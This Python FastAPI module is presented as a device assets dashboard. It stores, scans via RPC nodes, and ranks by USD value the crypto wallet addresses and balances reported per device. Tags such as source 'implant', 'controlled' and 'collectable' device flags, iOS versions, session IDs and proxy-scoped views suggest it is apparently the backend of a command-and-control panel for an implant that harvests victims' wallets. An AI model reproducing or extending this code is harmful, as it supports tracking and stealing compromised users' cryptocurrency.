"""
Device assets dashboard — per-device wallet balances and aggregate metrics.
"""

from __future__ import annotations

import time
from typing import Any, Optional

from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel

from .audit import audit
from .chain_scanner import scan_all_device_balances, scan_device_balances, test_rpc_connections
from .collect_catalog import COLLECT_ASSETS, RPC_FORM_FIELDS, WALLET_KEYS, compute_row_total_usd
from .auth import require_console_user
from .database import (
    get_device_assets,
    get_device_assets_dashboard,
    get_device_asset_rows_for_scan,
    get_device_by_id,
    get_proxy_descendant_ids,
    get_rpc_settings,
    save_device_assets,
    save_rpc_settings,
)
from .state import app_state

router = APIRouter(tags=["Device Assets"])


class DeviceAssetsUpdate(BaseModel):
    eth_address: str = ""
    trx_address: str = ""
    btc_address: str = ""
    bsc_address: str = ""
    sol_address: str = ""
    eth_usdc: float = 0
    eth_usdt: float = 0
    eth_native: float = 0
    trx_usdt: float = 0
    trx_native: float = 0
    btc: float = 0
    bsc_usdt: float = 0
    bsc_native: float = 0
    sol_usdt: float = 0
    sol_native: float = 0
    wallet_count: int = 0
    status: str = "ready"


class RpcNodesUpdate(BaseModel):
    eth_rpc: str = ""
    trx_rpc: str = ""
    btc_api: str = ""
    bsc_rpc: str = ""
    sol_rpc: str = ""
    eth_usdc_contract: str = ""
    trx_usdt_contract: str = ""


def _float_val(value: Any) -> Optional[float]:
    if value is None:
        return None
    try:
        return float(value)
    except (TypeError, ValueError):
        return None


def _str_addr(value: Any) -> str:
    if value is None:
        return ""
    return str(value).strip()


def _apply_wallet_entry(
    parsed: dict[str, Any],
    chain: str,
    token: str,
    addr: str,
    amount: Optional[float],
) -> None:
    chain = chain.upper()
    token = token.upper()
    if chain in ("ETH", "ERC20") or (chain == "ETH" and token in ("USDC", "USDT", "ETH", "")):
        if addr:
            parsed["eth_address"] = parsed.get("eth_address") or addr
        if token == "USDT" and amount is not None:
            parsed["eth_usdt"] = float(parsed.get("eth_usdt", 0) or 0) + amount
        elif token == "USDC" and amount is not None:
            parsed["eth_usdc"] = float(parsed.get("eth_usdc", 0) or 0) + amount
        elif token in ("ETH", "") and amount is not None:
            parsed["eth_native"] = float(parsed.get("eth_native", 0) or 0) + amount
    elif chain in ("TRX", "TRON") or token == "USDT":
        if addr:
            parsed["trx_address"] = parsed.get("trx_address") or addr
        if token == "USDT" and amount is not None:
            parsed["trx_usdt"] = float(parsed.get("trx_usdt", 0) or 0) + amount
        elif token in ("TRX", "") and amount is not None:
            parsed["trx_native"] = float(parsed.get("trx_native", 0) or 0) + amount
    elif chain == "BTC" or token == "BTC":
        if addr:
            parsed["btc_address"] = parsed.get("btc_address") or addr
        if amount is not None:
            parsed["btc"] = float(parsed.get("btc", 0) or 0) + amount
    elif chain == "BSC":
        if addr:
            parsed["bsc_address"] = parsed.get("bsc_address") or addr
        if token == "USDT" and amount is not None:
            parsed["bsc_usdt"] = float(parsed.get("bsc_usdt", 0) or 0) + amount
        elif token in ("BNB", "") and amount is not None:
            parsed["bsc_native"] = float(parsed.get("bsc_native", 0) or 0) + amount
    elif chain == "SOL":
        if addr:
            parsed["sol_address"] = parsed.get("sol_address") or addr
        if token == "USDT" and amount is not None:
            parsed["sol_usdt"] = float(parsed.get("sol_usdt", 0) or 0) + amount
        elif token in ("SOL", "") and amount is not None:
            parsed["sol_native"] = float(parsed.get("sol_native", 0) or 0) + amount


def parse_assets_from_payload(body: dict[str, Any]) -> Optional[dict[str, Any]]:
    if not isinstance(body, dict):
        return None
    if body.get("event") == "collect_result" or body.get("type") == "collect_result":
        return None

    nested = body.get("assets") if isinstance(body.get("assets"), dict) else body
    wallets = body.get("wallets") if isinstance(body.get("wallets"), list) else []
    parsed: dict[str, Any] = {}

    for key in WALLET_KEYS:
        val = _str_addr(nested.get(key) or nested.get(key.replace("_address", "_wallet")))
        if val:
            parsed[key] = val

    for asset in COLLECT_ASSETS:
        bal = _float_val(nested.get(asset["balance_key"]))
        if bal is not None:
            parsed[asset["balance_key"]] = bal

    for wallet in wallets:
        if not isinstance(wallet, dict):
            continue
        _apply_wallet_entry(
            parsed,
            str(wallet.get("chain", "")),
            str(wallet.get("token", "")),
            _str_addr(wallet.get("address")),
            _float_val(wallet.get("balance")) or _float_val(wallet.get("amount")),
        )

    has_addr = any(parsed.get(wk) for wk in WALLET_KEYS)
    has_bal = any(parsed.get(a["balance_key"]) for a in COLLECT_ASSETS)
    if not has_addr and not has_bal:
        return None

    wallet_count = nested.get("wallet_count")
    if wallet_count is None:
        wallet_count = sum(1 for wk in WALLET_KEYS if parsed.get(wk)) or len(wallets)

    parsed["wallet_count"] = int(wallet_count or 0)
    parsed["status"] = str(
        nested.get("status") or body.get("status") or ("pending_scan" if has_addr else "reported")
    )
    parsed["source"] = "implant"
    return parsed


async def upsert_assets_for_device(device_id: str, body: dict[str, Any]) -> Optional[dict]:
    parsed = parse_assets_from_payload(body)
    if not parsed or not device_id:
        return None

    now = time.time()
    existing = get_device_assets(device_id) or {}
    payload = {"device_id": device_id, **existing, **parsed, "updated_at": now}
    has_balances = any(float(payload.get(a["balance_key"], 0) or 0) for a in COLLECT_ASSETS)
    if not has_balances:
        payload["total_usd"] = existing.get("total_usd", 0)
    else:
        payload["total_usd"] = compute_row_total_usd(payload)
    payload["last_scan_at"] = existing.get("last_scan_at", 0)

    save_device_assets(payload)

    rpc = get_rpc_settings()
    if any(payload.get(wk) for wk in WALLET_KEYS):
        if any(rpc.get(f) for f in ("eth_rpc", "trx_rpc", "btc_api", "bsc_rpc", "sol_rpc")):
            try:
                scanned = await scan_device_balances(device_id, rpc)
                payload.update(scanned)
            except Exception as exc:
                payload["scan_error"] = str(exc)

    await app_state.broadcast_sse({
        "type": "device_assets_update",
        "data": {"device_id": device_id, "total_usd": payload.get("total_usd", 0)},
    })
    return payload


def _device_assets_out(row: dict) -> dict:
    out = {
        "device_id": row.get("device_id", ""),
        "name": row.get("name", ""),
        "ip": row.get("ip", ""),
        "ios_version": row.get("ios_version", ""),
        "domain": row.get("domain", ""),
        "controlled": row.get("controlled", False),
        "authorized": row.get("authorized", False),
        "collectable": row.get("collectable", False),
        "session_id": row.get("session_id", ""),
        "total_usd": round(float(row.get("total_usd", 0) or compute_row_total_usd(row)), 2),
        "wallet_count": int(row.get("wallet_count", 0) or 0),
        "status": row.get("status", "unknown"),
        "source": row.get("source", "manual"),
        "scan_error": row.get("scan_error", ""),
        "last_scan_at": row.get("last_scan_at", 0),
        "updated_at": row.get("assets_updated_at", row.get("updated_at", 0)),
        "balances": {},
        "wallets": {},
    }
    for wk in WALLET_KEYS:
        out["wallets"][wk] = row.get(wk, "")
        out[wk.replace("_address", "_wallet") if wk.endswith("_address") else wk] = row.get(wk, "")
        out[wk] = row.get(wk, "")
    for asset in COLLECT_ASSETS:
        val = round(float(row.get(asset["balance_key"], 0) or 0), 8 if asset["token"] == "BTC" else 4)
        out["balances"][asset["id"]] = val
        out[asset["balance_key"]] = val
    return out


@router.get("/api/settings/rpc-nodes", summary="Get RPC node configuration")
async def get_rpc_nodes():
    rpc = get_rpc_settings()
    return {"code": 0, "data": {"values": rpc, "fields": RPC_FORM_FIELDS}}


@router.put("/api/settings/rpc-nodes", summary="Save RPC node configuration")
async def put_rpc_nodes(body: RpcNodesUpdate):
    saved = save_rpc_settings(body.model_dump())
    audit("update_rpc_nodes", "settings:rpc")
    return {"code": 0, "data": saved}


@router.post("/api/settings/rpc-nodes/test", summary="Test RPC connectivity")
async def test_rpc_nodes():
    checks = await test_rpc_connections()
    configured = [k for k, v in checks.items() if v.get("detail") != "not configured"]
    ok = all(checks[k].get("ok") for k in configured) if configured else False
    return {"code": 0, "data": {"checks": checks, "all_ok": ok}}


@router.post("/api/devices/assets/scan-all", summary="Scan all device wallets via RPC")
async def scan_all_assets():
    result = await scan_all_device_balances()
    await app_state.broadcast_sse({
        "type": "device_assets_update",
        "data": {"scanned": result.get("scanned", 0)},
    })
    return {"code": 0, "data": result}


@router.post("/api/devices/{device_id}/assets/scan", summary="Scan one device via RPC")
async def scan_one_asset(device_id: str):
    device = get_device_by_id(device_id)
    if not device:
        raise HTTPException(404, "Device not found")
    result = await scan_device_balances(device_id)
    await app_state.broadcast_sse({
        "type": "device_assets_update",
        "data": {"device_id": device_id, "total_usd": result.get("total_usd", 0)},
    })
    return {"code": 0, "data": result}


@router.get("/api/devices/assets/dashboard", summary="Device assets dashboard")
async def assets_dashboard(request: Request, limit: int = 500):
    auth = require_console_user(request)
    data = get_device_assets_dashboard(limit=limit)
    if auth.get("role") == "proxy":
        allowed = set(get_proxy_descendant_ids(auth.get("proxy_id", "")))
        data["devices"] = [d for d in data["devices"] if d.get("proxy_id") in allowed]
        data["top_devices"] = [d for d in data["top_devices"] if d.get("device_id") in {x["device_id"] for x in data["devices"]}]
        total_usd = sum(float(d.get("total_usd", 0) or 0) for d in data["devices"])
        data["summary"]["total_usd"] = round(total_usd, 2)
        data["summary"]["tracked_devices"] = len(data["devices"])
    rpc = get_rpc_settings()
    data["summary"]["rpc_configured"] = bool(
        any(rpc.get(k) for k in ("eth_rpc", "trx_rpc", "btc_api", "bsc_rpc", "sol_rpc"))
    )
    return {
        "code": 0,
        "data": {
            "summary": data["summary"],
            "chain_breakdown": data["chain_breakdown"],
            "top_devices": data["top_devices"],
            "devices": [_device_assets_out(row) for row in data["devices"]],
            "catalog": COLLECT_ASSETS,
            "rpc": {"values": rpc, "fields": RPC_FORM_FIELDS},
        },
    }


@router.get("/api/devices/{device_id}/assets", summary="Get device asset snapshot")
async def get_assets(device_id: str):
    device = get_device_by_id(device_id)
    if not device:
        raise HTTPException(404, "Device not found")
    assets = get_device_assets(device_id) or {"device_id": device_id}
    merged = {**device, **assets, "assets_updated_at": assets.get("updated_at", 0)}
    return {"code": 0, "data": _device_assets_out(merged)}


@router.put("/api/devices/{device_id}/assets", summary="Update device wallets / balances manually")
async def update_assets(device_id: str, body: DeviceAssetsUpdate):
    device = get_device_by_id(device_id)
    if not device:
        raise HTTPException(404, "Device not found")

    now = time.time()
    payload = body.model_dump()
    payload.update({
        "device_id": device_id,
        "source": "manual",
        "scan_error": "",
        "last_scan_at": now,
        "updated_at": now,
        "total_usd": compute_row_total_usd(body.model_dump()),
    })
    save_device_assets(payload)
    audit("update_device_assets", f"device:{device_id}", detail=f"usd={payload['total_usd']}")

    await app_state.broadcast_sse({
        "type": "device_assets_update",
        "data": {"device_id": device_id, "total_usd": payload["total_usd"]},
    })
    return {"code": 0, "data": _device_assets_out({**device, **payload, "assets_updated_at": now})}
